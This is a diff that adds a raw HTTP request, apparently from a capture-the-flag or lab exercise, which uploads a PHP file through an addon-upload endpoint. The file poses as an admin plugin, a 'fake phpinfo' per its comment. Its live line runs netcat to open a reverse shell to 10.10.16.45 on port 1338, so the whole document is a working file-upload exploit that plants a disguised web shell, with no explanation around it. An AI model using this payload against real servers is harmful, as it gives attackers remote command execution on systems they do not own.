@@ -1,0 +1,25 @@
+POST /addon-download.php?addon=/addon-upload.php HTTP/1.1
+Host: 127.0.0.1:60080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1:60080/menu.php?addon=addons/ots-fs.php
+Content-Type: multipart/form-data; boundary=---------------------------98525120815575954697690807
+Cookie: PHPSESSID=7rgjg7nmu1j62pk0slb67ds3m3
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 352
+
+-----------------------------98525120815575954697690807
+Content-Disposition: form-data; name="addon"; filename="ots-shellz.php"
+
+<?php
+# Dumbserver Admin Plugin
+# Fake phpinfo // or whatever we want
+
+#echo shell_exec("whoami" );
+echo shell_exec("nc -e /bin/sh 10.10.16.45 1338");
+?>
+
+-----------------------------98525120815575954697690807--
